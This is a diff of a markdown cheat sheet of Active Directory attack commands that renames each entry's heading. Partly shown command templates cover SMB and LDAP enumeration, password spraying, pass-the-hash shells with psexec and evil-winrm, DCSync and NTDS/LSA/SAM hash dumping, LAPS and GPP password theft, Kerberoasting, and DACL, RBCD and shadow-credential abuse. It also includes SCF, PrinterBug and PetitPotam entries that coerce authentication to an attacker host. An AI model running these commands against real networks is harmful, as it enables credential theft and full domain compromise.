@@ -6,7 +6,7 @@
 
 ---
 
-## AD - Anonymous SMB Share Enum
+## enum smb shares anonymous
 Enumerate shares with null/guest session.
 
 ```bash
@@ -17,7 +17,7 @@ smbmap -H {{TARGET:ip}} -u Guest -p ""
 
 ---
 
-## AD - Authenticated SMB Share Enum
+## enum smb shares authenticated
 Enumerate shares with creds.
 
 ```bash
@@ -28,7 +28,7 @@ smbmap -H {{TARGET:ip}} -u "{{USERNAME:str:user}}" -p "{{PASSWORD:str:pass}}" -d
 
 ---
 
-## AD - SMB Recursive Mass Download
+## download smb share recursive
 Pull all files from a writable share.
 
 ```bash
@@ -39,7 +39,7 @@ smbclient //{{TARGET:ip}}/{{SHARE:str:Backups}} -U "{{USERNAME:str:guest}}%{{PAS
 
 ---
 
-## AD - Mount SMB Share (cifs)
+## mount smb share cifs
 Mount SMB share as filesystem for fast browsing.
 
 ```bash
@@ -50,7 +50,7 @@ sudo mount -t cifs //{{TARGET:ip}}/{{SHARE:str:Backups}} /mnt -o user={{USERNAME
 
 ---
 
-## AD - User Enum (RID Brute via NetExec)
+## enum users RID brute smb
 Pull users via RID brute against SMB.
 
 ```bash
@@ -61,7 +61,7 @@ nxc smb {{TARGET:ip}} -u "{{USERNAME:str:guest}}" -p "" --rid-brute
 
 ---
 
-## AD - Domain Info via NetExec
+## enum domain info smb
 Quick domain fingerprint.
 
 ```bash
@@ -72,7 +72,7 @@ nxc smb {{TARGET:ip}}
 
 ---
 
-## AD - Password Spray (NetExec SMB)
+## spray passwords smb
 Spray one password across many users.
 
 ```bash
@@ -83,7 +83,7 @@ nxc smb {{TARGET:ip}} -u {{USERLIST:wordlist:users.txt}} -p '{{PASSWORD:str:Welc
 
 ---
 
-## AD - Password Spray (Kerberos)
+## spray passwords kerberos
 Spray over Kerberos to avoid SMB lockouts.
 
 ```bash
@@ -94,7 +94,7 @@ nxc smb {{TARGET:ip}} -u {{USERLIST:wordlist:users.txt}} -p '{{PASSWORD:str:Welc
 
 ---
 
-## AD - LDAP Bind Test
+## test ldap bind creds
 Confirm LDAP creds.
 
 ```bash
@@ -105,7 +105,7 @@ ldapsearch -x -H ldap://{{TARGET:ip}} -D "{{USERNAME:str:user}}@{{DOMAIN:domain:
 
 ---
 
-## AD - Anonymous LDAP Dump
+## dump ldap anonymous
 Pull objects without creds when allowed.
 
 ```bash
@@ -116,7 +116,7 @@ ldapsearch -x -H ldap://{{TARGET:ip}} -b "dc={{DC1:str:corp}},dc={{DC2:str:local
 
 ---
 
-## AD - BloodHound Collection (Linux)
+## collect bloodhound linux
 Collect graph data with bloodhound-python.
 
 ```bash
@@ -127,7 +127,7 @@ bloodhound-python -u "{{USERNAME:str:user}}" -p "{{PASSWORD:str:pass}}" -d {{DOM
 
 ---
 
-## AD - BloodHound with Kerberos Ticket
+## collect bloodhound kerberos ticket
 Collect using ccache instead of password.
 
 ```bash
@@ -138,7 +138,7 @@ KRB5CCNAME=user.ccache bloodhound-python -u "{{USERNAME:str:user}}" -k -d {{DOMA
 
 ---
 
-## AD - SMB Pass-the-Hash
+## pass-the-hash smb
 Authenticate with NT hash via SMB.
 
 ```bash
@@ -149,7 +149,7 @@ nxc smb {{TARGET:ip}} -u {{USERNAME:str:Administrator}} -H {{NTHASH:str:31d6cfe0
 
 ---
 
-## AD - WinRM Pass-the-Hash
+## pass-the-hash winrm shell
 Get a shell via WinRM with hash.
 
 ```bash
@@ -160,7 +160,7 @@ evil-winrm -i {{TARGET:ip}} -u "{{USERNAME:str:Administrator}}" -H "{{NTHASH:str
 
 ---
 
-## AD - Impacket psexec (PtH)
+## pass-the-hash psexec SYSTEM
 Drop SYSTEM shell with hash.
 
 ```bash
@@ -171,7 +171,7 @@ impacket-psexec -hashes :{{NTHASH:str:31d6cfe0d16ae931b73c59d7e0c089c0}} {{USERN
 
 ---
 
-## AD - Impacket secretsdump LOCAL
+## dump SAM offline hives
 Dump SAM from offline registry hives.
 
 ```bash
@@ -182,7 +182,7 @@ impacket-secretsdump -sam SAM -system SYSTEM LOCAL
 
 ---
 
-## AD - Impacket secretsdump (DCSync)
+## dcsync dump ntlm hashes
 Pull all NTLM hashes from DC (requires DCSync rights).
 
 ```bash
@@ -193,7 +193,7 @@ impacket-secretsdump -just-dc-ntlm {{DOMAIN:domain:corp.local}}/{{USERNAME:str:A
 
 ---
 
-## AD - DCSync via Kerberos
+## dcsync kerberos ticket
 DCSync using cached TGT.
 
 ```bash
@@ -204,7 +204,7 @@ impacket-secretsdump -k -no-pass -just-dc {{DC_HOST:str:dc01.corp.local}}
 
 ---
 
-## AD - Find DCSync Rights (PowerView)
+## find dcsync rights powerview
 Locate principals with DS-Replication-Get-Changes.
 
 ```bash
@@ -215,7 +215,7 @@ echo 'Get-DomainObjectAcl -SearchBase "DC=corp,DC=local" -ResolveGUIDs | ?{ $_.O
 
 ---
 
-## AD - Set User Password (bloodyAD)
+## reset user password bloodyad
 Force-set a target user password (needs reset rights).
 
 ```bash
@@ -226,7 +226,7 @@ bloodyAD -u "{{USERNAME:str:user}}" -p "{{PASSWORD:str:pass}}" -d {{DOMAIN:domai
 
 ---
 
-## AD - Add Shadow Credentials (bloodyAD)
+## add shadow credentials bloodyad
 Add msDS-KeyCredentialLink for PKINIT abuse.
 
 ```bash
@@ -237,7 +237,7 @@ bloodyAD -u "{{USERNAME:str:user}}" -p "{{PASSWORD:str:pass}}" -d {{DOMAIN:domai
 
 ---
 
-## AD - Add GenericAll over OU (bloodyAD)
+## add genericall over OU
 Grant GenericAll over an OU to a principal.
 
 ```bash
@@ -248,7 +248,7 @@ bloodyAD -u "{{USERNAME:str:user}}" -p "{{PASSWORD:str:pass}}" -d {{DOMAIN:domai
 
 ---
 
-## AD - DACL Edit (impacket-dacledit)
+## write DACL fullcontrol
 Write FullControl on target object.
 
 ```bash
@@ -259,7 +259,7 @@ impacket-dacledit -action 'write' -rights 'FullControl' -principal '{{ATTACKER:s
 
 ---
 
-## AD - PKINIT to TGT (gettgtpkinit)
+## pkinit cert to TGT
 Abuse cert + key for TGT.
 
 ```bash
@@ -270,7 +270,7 @@ python3 PKINITtools/gettgtpkinit.py -cert-pem {{CERT:file:user_cert.pem}} -key-p
 
 ---
 
-## AD - LDAP Add Computer (Powermad / impacket-addcomputer)
+## add computer account ldap
 Add a fake computer object (MachineAccountQuota=10).
 
 ```bash
@@ -281,7 +281,7 @@ impacket-addcomputer "{{DOMAIN:domain:corp.local}}/{{USERNAME:str:user}}:{{PASSW
 
 ---
 
-## AD - Resource-Based Constrained Delegation (rbcd)
+## rbcd resource-based delegation
 Set msDS-AllowedToActOnBehalfOfOtherIdentity for RBCD attack.
 
 ```bash
@@ -292,7 +292,7 @@ impacket-rbcd -delegate-from '{{NEW_COMP:str:fake01}}$' -delegate-to '{{TARGET_C
 
 ---
 
-## AD - SCF File Drop (NetNTLM Coerce)
+## coerce netntlm scf drop
 Drop .scf to coerce hash from anyone browsing share.
 
 ```bash
@@ -303,7 +303,7 @@ printf "[Shell]\nCommand=2\nIconFile=\\\\\\\\{{LHOST:ip}}\\\\share\\\\test.ico\n
 
 ---
 
-## AD - PrinterBug Coerce (printerbug.py)
+## coerce auth printerbug
 Trigger SpoolService to authenticate to attacker.
 
 ```bash
@@ -314,7 +314,7 @@ python3 printerbug.py {{DOMAIN:domain:corp.local}}/{{USERNAME:str:user}}:{{PASSW
 
 ---
 
-## AD - PetitPotam (Coerce)
+## coerce DC auth petitpotam
 Coerce DC to authenticate via EFSRPC.
 
 ```bash
@@ -325,7 +325,7 @@ python3 PetitPotam.py {{LHOST:ip}} {{TARGET:ip}}
 
 ---
 
-## AD - SCCM/MECM Looter
+## loot sccm mecm creds
 Hunt for SCCM/MECM creds via NetExec module.
 
 ```bash
@@ -336,7 +336,7 @@ nxc smb {{TARGET:ip}} -u "{{USERNAME:str:user}}" -p "{{PASSWORD:str:pass}}" -M s
 
 ---
 
-## AD - Dump LSA Secrets via NetExec
+## dump lsa secrets
 Dump cached creds from a host.
 
 ```bash
@@ -347,7 +347,7 @@ nxc smb {{TARGET:ip}} -u "{{USERNAME:str:Administrator}}" -p "{{PASSWORD:str:pas
 
 ---
 
-## AD - NTDS Dump via NetExec
+## dump ntds smb
 Dump NTDS over SMB if local admin.
 
 ```bash
@@ -358,7 +358,7 @@ nxc smb {{TARGET:ip}} -u "{{USERNAME:str:Administrator}}" -p "{{PASSWORD:str:pas
 
 ---
 
-## AD - LAPS Read (NetExec)
+## read laps passwords ldap
 Pull cleartext LAPS passwords if reader.
 
 ```bash
@@ -369,7 +369,7 @@ nxc ldap {{TARGET:ip}} -u "{{USERNAME:str:user}}" -p "{{PASSWORD:str:pass}}" -M 
 
 ---
 
-## AD - GPP Password Decrypt
+## decrypt gpp password sysvol
 Find + decrypt cpassword from SYSVOL Group Policy Preferences.
 
 ```bash
@@ -380,7 +380,7 @@ nxc smb {{DC_IP:ip:10.10.10.1}} -u "{{USERNAME:str:user}}" -p "{{PASSWORD:str:pa
 
 ---
 
-## AD - Find Kerberoastable
+## find kerberoastable SPN accounts
 Pull SPN-bearing accounts.
 
 ```bash
@@ -391,7 +391,7 @@ impacket-GetUserSPNs {{DOMAIN:domain:corp.local}}/{{USERNAME:str:user}}:{{PASSWO
 
 ---
 
-## AD - Force-Change Computer Password (changepasswd)
+## change computer account password
 Set new computer-account password / NT hash.
 
 ```bash
